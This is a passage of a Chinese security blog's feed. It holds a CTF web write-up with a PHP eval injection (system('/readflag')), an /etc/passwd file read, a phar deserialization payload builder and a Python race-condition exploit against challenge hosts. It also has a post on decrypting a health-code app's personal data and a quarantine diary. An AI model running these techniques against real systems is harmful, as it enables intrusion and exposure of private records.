class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableBody</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data;</span><br><span class="line"><span class="variable">$n</span>=count(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>.<span class="variable">$n</span>.<span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$row</span>=<span class="number">0</span>;<span class="variable">$row</span>&lt;<span class="variable">$n</span>;++<span class="variable">$row</span>)</span><br><span class="line"><span class="keyword">$this</span>-&gt;renderTableRow(<span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&lt;td colspan=&quot;&#x27;</span>.count(<span class="keyword">$this</span>-&gt;columns).<span class="string">&#x27;&quot; class=&quot;empty&quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/tbody&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>renderTableBody()</code> -&gt; <code>renderTableRow()</code> -&gt; <code>evaluateExpression()</code><br />函数<code>evaluateExpression()</code>在Base.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evaluateExpression</span>(<span class="params"><span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_expression_</span>.<span class="string">&quot; &quot;</span>.var_dump(<span class="variable">$_data_</span>).<span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(is_string(<span class="variable">$_expression_</span>))</span><br><span class="line">&#123;</span><br><span class="line">extract(<span class="variable">$_data_</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$_expression_</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$_data_</span>[]=<span class="keyword">$this</span>;</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="variable">$_expression_</span>, <span class="variable">$_data_</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到最终目的是调用函数中<code>evaluateExpression()</code>的函数<code>eval()</code>以造成RCE<br />那么可以构造出一个POP链</p><p><code>$template = &quot;&#123;TableBody&#125;&quot;</code><br />经过POP链<code>run()</code> -&gt; <code>renderContent()</code> -&gt; <code>renderSection()</code>后<br />到达函数<code>renderTableBody()</code><br />这里有<code>count($data)</code>，然后进行迭代运行函数<code>renderTableRow()</code><br />所以需要<br /><code>$data = 1</code><br />到达函数<code>renderTableRow()</code>后，有两条路可以进入函数<code>evaluateExpression()</code><br />这里我走的是第一条路，只需要把<code>rowHtmlOptionsExpression</code>设置为不为NULL即可<br />进入函数<code>evaluateExpression()</code>后就会直接<code>eval($rowHtmlOptionsExpression)</code><br />所以放命令即可<br /><code>$rowHtmlOptionsExpression = &quot;system(\&quot;/readflag\&quot;)&quot;</code></p><p>回到开头的两个参数，代入上述参数即可获得flag</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://aa876c17-0ddb-43f7-978e-1ca06b58fe7e.node4.buuoj.cn:81/?action=TestView --data <span class="string">&#x27;properties[template]=&#123;TableBody&#125;&amp;properties[data]=0&amp;properties[rowHtmlOptionsExpression]=system(&quot;/readflag&quot;)&#x27;</span> | grep flag</span><br><span class="line">flag&#123;e2fec3cf-a368-45da-9277-2f21aa384a78&#125;</span><br></pre></td></tr></table></figure><p>队友本来RCE成功了，hackerbar把phpinfo挡住了，以为没RCE出来…</p><hr /><h1 id="soeasy_php"><a class="markdownIt-Anchor" href="#soeasy_php"></a> soeasy_php</h1><p>给的附件是个dockerfile，没啥用感觉</p><p>进来就是个上传点，但是我上传了个php后给我的上传路径后缀是png我就觉得不对了<br />F12查看源码可以看到还有个编辑头像功能<br />尝试将头像换为其他文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/edit.php --data <span class="string">&#x27;png=/etc/passwd&amp;flag=&#x27;</span></span><br><span class="line">成功更换头像</span><br><span class="line"></span><br><span class="line">curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/uploads/head.png</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>然后就读源码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#edit.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = fread(<span class="variable">$f</span>, filesize(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            filewrite(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//不给我看我自己写个flag。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        unlink(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (symlink(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功更换头像&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非正常文件，已被删除&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼反序列化，但是半天没看见函数<code>unserialize()</code><br />翻了翻笔记才想起来这玩意是phar反序列化<br />通过文件函数来触发反序列化<br />这里可以触发的有</p><ul><li><code>fopen()</code></li><li><code>file_put_contents()</code></li><li><code>unlink()</code></li></ul><p>首先参数<code>png</code>的正则绕不过去，后面两个函数<code>filewrite()</code>参数定死，函数<code>unlink($head)</code>参数定死<br />那就剩下最后一个函数<code>unlink($filename)</code>了<br />而执行函数<code>unlink($filename)</code>需要函数<code>symlink($filename, $head)</code><br />尝试给filename塞个数组进去，symlink确实寄了，但是unlink也寄了<br />想来想去还是只能竞争symlink了<br />只要我请求够快，就会有两个PHP线程在<code>unlink($head)</code>之后执行<code>symlink($filename, $head)</code><br />但是<code>symlink()</code>不能创建同名链接，所以慢的那个会False，然后运行<code>unlink($filename)</code>，即触发phar反序列化</p><p>即使触发了phar反序列化，flag内容被写入到了<code>/tmp/flag.txt</code><br />要读取flag必定要<code>symlink(&quot;/tmp/flag.txt&quot;, &quot;uploads/head.png&quot;)</code>，然后访问head.png<br />但在此之前，会执行<code>filewrite(&quot;/tmp/flag.txt&quot;, &quot;Don't give me flag&quot;);</code>或<code>filewrite(&quot;/tmp/flag.txt&quot;, $flag);</code><br />也就是说<code>/tmp/flag.txt</code>会被覆写，所以需要再进行一次竞争</p><p>但是从总体流程上来讲，这两次竞争完全可以放一起，以达到以下竞争效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">覆写错误flag -&gt;</span><br><span class="line">symlink链接phar文件 -&gt;</span><br><span class="line">symlink竞争触发unlink(phar) -&gt;</span><br><span class="line">覆写正确flag -&gt;</span><br><span class="line">symlink链接&#x2F;tmp&#x2F;flag.txt -&gt;</span><br><span class="line">读取正确flag</span><br></pre></td></tr></table></figure><p>这个思路看起来有点天方夜谭，但是还是能竞争出来的<br />（这题做出来的时候总感觉自己是非预期解法）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#php.ini: phar.readonly = Off</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> flag();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();<span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/uploads/head.png&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/edit.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlink</span>():</span></span><br><span class="line">    req.post(url2, data=&#123;<span class="string">&quot;png&quot;</span>:<span class="string">&quot;phar:///var/www/html/uploads/01908b979c3dea9fc658e68ab8c560e4.png&quot;</span>, <span class="string">&quot;flag&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">symlink</span>():</span></span><br><span class="line">    req.post(url2, data=&#123;<span class="string">&quot;png&quot;</span>:<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;flag&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t1 = threading.Thread(target=unlink, args=())</span><br><span class="line">        t2 = threading.Thread(target=symlink, args=())</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#getflag</span></span><br><span class="line">        flag = req.get(url1).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python exp.py</span><br><span class="line">flag&#123;eea59afa-414d-4045-8d7f-808abc804951&#125;</span><br></pre></td></tr></table></figure><hr /><p>两个题做了五个小时，只能明天打游戏了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了&lt;br /&gt;
说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩&lt;br /&gt;
但是我上一次碰CTF还是去年的省赛…&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Web" scheme="https://yoloyolo.top/tags/Web/"/>
    
    <category term="PHP" scheme="https://yoloyolo.top/tags/PHP/"/>
    
    <category term="POP" scheme="https://yoloyolo.top/tags/POP/"/>
    
    <category term="Unserialize" scheme="https://yoloyolo.top/tags/Unserialize/"/>
    
  </entry>
  
  <entry>
    <title>闽盾杯/黑盾杯 2021 WP</title>
    <link href="https://yoloyolo.top/2021/12/07/MinDunCup-2021/"/>
    <id>https://yoloyolo.top/2021/12/07/MinDunCup-2021/</id>
    <published>2021-12-07T08:16:04.000Z</published>
    <updated>2022-05-14T16:00:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>2/13<br />但是还是觉得自己菜得要死<br /><a href="https://shimo.im/docs/Gt8GCcQ6rQ3vJxh6">福建省第二届“闽盾杯”网络空间安全大赛黑盾赛道WP</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2/13&lt;br /&gt;
但是还是觉得自己菜得要死&lt;br /&gt;
&lt;a href=&quot;https://shimo.im/docs/Gt8GCcQ6rQ3vJxh6&quot;&gt;福建省第二届“闽盾杯”网络空间安全大赛黑盾赛道WP&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Windows" scheme="https://yoloyolo.top/tags/Windows/"/>
    
    <category term="Cyber_Attribution" scheme="https://yoloyolo.top/tags/Cyber-Attribution/"/>
    
  </entry>
  
  <entry>
    <title>X闽健康码分析</title>
    <link href="https://yoloyolo.top/2021/11/15/X-Min-Health-Code/"/>
    <id>https://yoloyolo.top/2021/11/15/X-Min-Health-Code/</id>
    <published>2021-11-16T03:35:58.000Z</published>
    <updated>2022-06-27T18:16:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>属于是白忙活了，但没完全白忙活</p><a id="more"></a><p>起因是某个选修课的老师觉得我这个识别口罩自动开关门的项目太简单了，事实上我也觉得很简单，甚至自动开关门我都想用只一个被驱动的异步电机糊弄过去<br />后来想着加点活，然后想到了去医院体检的时候，医院门口的门禁是识别口罩+扫X闽健康码<br />所以就想着可能X闽健康码的内容应该挺好解析的<br />截图后丢直接微信扫一扫，和我想得一模一样的Base64编码<br />传到电脑上解码的时候蚌埠住了，估计是加密了，格式如下<br />“MZTJKM_” + 236字节Base64编码 + “#|” + 精确到毫秒的Unix时间戳<br />所以就想着去把中间的Base64解出来<br />然后凭着上次且仅一次的三个月前渗透APP的模糊记忆<br />打开jadx，先看看有没有双向认证，很庆幸是&quot;零向认证&quot;<br />搜索关键字&quot;AES&quot;，然后找了半天的密钥<br />换了&quot;CBC&quot;搜索，然后还找到了3DES的算法<br />感觉不对劲了<br />想办法抓手机APP的包，一通瞎摁点出了个请求X闽健康码的HTTP请求，虽说后面再也没摁出来过了<br />然后我拿着HTTP请求的URL回jadx接着搜索，然后浪费了一个小时<br />后来我才想到，这APP就是个壳子罢了<br />二维码的内容实际上还是Server给的<br />而且请求的URL不在APP里面而是在HTML页面里<br />然后开F12看JS去了，属实是有点坐牢<br />看到后面看到了个&quot;decrypt&quot;的字样，感觉有戏<br />跟进之后就是混淆的JS，此时感觉差不多寄了<br />先把JS反混淆一下大概看看<br />然后把混淆的代码丢console里，挨个跑被混淆的解密参数<br />然后从之前X闽健康码HTTP响应的json里扒拉出来data<br />解密之后得到了姓名，身份证号，健康状态，还有二维码的文本形式（没有后面的时间戳，时间戳是js另外加的）等<br />挺有意思都，新生杯密码学压轴就出这个了<br />到头来X闽健康码的内容还是不知道咋解析<br />回头想想去医院扫健康码的过程<br />要么是医院的门禁内置了X闽健康码的解密函数，能进一步提取里面的信息<br />要么那玩意就提取二维码的文本后匹配&quot;^MZTJKM_[0-9a-zA-Z+/=]{236}#|[0-9]{13}$&quot;<br />但是要是有人拿个红码能进去吗，应该不行<br />所以可能扫码有个颜色识别，这个我就不会了</p><hr /><p>后来又分析了下<br />16字节的分组加密，分组加密方式是ECB<br />我一开始以为应该是AES，后来跟老师讨论的时候说这种政府的项目应该是国密SM4之类的<br />根据我的猜测，中间存在一段在固定位置变动的22字节Base64编码，换算下来解码后正好差不多16字节<br />HTTP响应里也有个12字节的response_code会变动,所以这部分一直变动的16字节大概率是对应response_code<br />剩下4字节可以枚举，但是存在5种位置分布的情况<br />差不多(96 ** 4) * 5种可能<br />而且就算枚举出了全部的可能，也没办法通过明文与密文来还原出密钥，爆破16字节的密钥更不可能了，得爆破(256 ** 16) * (96 ** 4) * 5次，能爆破出来(96 ** 4) * 5个密钥，而且其中只有一个是对的<br />除非我有台量子计算机<br />也还有种可能，就是跟省人民政府去谈项目，但是没这个路子<br />总结来说就是，寄</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;属于是白忙活了，但没完全白忙活&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
  <entry>
    <title>蚌埠的一天</title>
    <link href="https://yoloyolo.top/2021/09/17/Unbengable-Day/"/>
    <id>https://yoloyolo.top/2021/09/17/Unbengable-Day/</id>
    <published>2021-09-18T02:31:18.000Z</published>
    <updated>2022-05-14T16:12:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>2021.09.16<br />根据真实事件改编，如有雷同，请务必对号入座</p><a id="more"></a><p>因为疫情的原因，学校改为上网课<br />早八是一节线上实践课，课程主题是物联网安全<br />07:59的闹钟响了<br />连接腾讯会议之后便半睡半醒地听课<br />这个课是第一次上<br />确切来说是从第一周开始，但是第一周的课因为“机房装修”所以“暂时不上”，通知时间是08:32，距离上课时间过去了32分钟<br />第二周的课因为“还没有开始”所以也不上了，通知时间是00:43<br />然后老师开始说有哪些课程方向可以选</p><ol><li>物联网设备隐私检测</li><li>指纹伪造</li><li>浏览器指纹</li><li>隐写</li><li>加密</li><li>取证</li><li>APP隐私检测</li><li>身份伪装</li></ol><p>我寻思了一下<br />我把上学期写得烂尾Beacon隐写改改得了<br />然后就继续半睡半醒地听课了<br />蚌埠住了</p><p>后来一直不知道说啥玩意，他给的参考文档可能涉及内容敏感，所以会发一个加密的压缩包，然后再发一个密码<br />我觉得他有点在脱裤子放屁<br />然后他说让我们不要乱传这些文件，以防止触发审查机制带来不必要的麻烦<br />我寻思你不整点政治敏感监管人员都懒得看你一眼<br />然后发了个四川大学学生被通报用校园网浏览色情网站27次的截图，然后补了一句“每个学校的校园网都有这个审查机制”<br />我不知道他是在威慑我们还是他想说校园网有监管机制<br />我寻思这种东西开个代理不就没这么多事了<br />退一步来讲，学校的校园网弱口令泛滥得不想说了，盗用账号的收益/(成本*风险)比率可以说是要多高有多高了<br />然后说如果触发了审查机制与他无关<br />我顿时顿悟了，他之前所说一切的可能只是在为这一步做铺垫<br />蚌埠住了</p><p>扯东扯西扯到了九点半就不扯了<br />我能感觉到他之前的内容在尽力地拖时长，可能是因为这节课按照教学计划是要上到11:30<br />但是他真的尽力了，实在不知道扯啥了，所以让我们退出腾讯会议<br />蚌埠住了</p><p>然后我就开始上网冲浪<br />某女纪委被人爆出打女拳&amp;非法获利<br />八小时后就出了自检通告<br />自罚三杯不了了之<br />热心网友向督导组邮想投递邮件叙述情况被拒收<br />反而N**游戏社区接到电话被警告<br />“总不能什么都查吧，没准会查出什么来呢”<br />互联网真的太精彩辣<br />蚌埠住了</p><p>我上网冲浪完后室友回来说辅导员叫我去隔离<br />我问真的假的<br />他说真的<br />为什么要隔离呢<br />因为部门那边有个同事跟一个确诊的坐高铁同一排上<br />然后上周四部门吃饭博饼<br />我也不知道那个同事是谁，当时饭局的二十几桌<br />可能我在这头，他在那头<br />然后我就被算是次密接了<br />一桌的还在上班，不一桌的已经准备隔离了<br />蚌埠住了</p><p>辅导员在哪呢<br />疫情爆发的当晚就回同安看老婆去了<br />其他老师说让他住寝室，但是拉都拉不住<br />可能是因为到了第二天封校了<br />然后可能他那天就在家里跟我们开年级大会<br />强调我们学校不是封校，是非必要不外出<br />这已经是我第二次听了<br />然后过两天同安就封了<br />辅导员仍然坚持居家办公<br />这种精神我觉得值得我们学习<br />蚌埠住了</p><p>然后我就开始收拾东西准备隔离了<br />拉着行李箱去找楼管办外出手续<br />她问我干嘛<br />我说隔离<br />她摆在桌上的双臂下意识得往回收了下<br />填完手续就提着行李去隔离了<br />蚌埠住了</p><p>我们当天一共去了五个人吃饭，所以五个人一起隔离<br 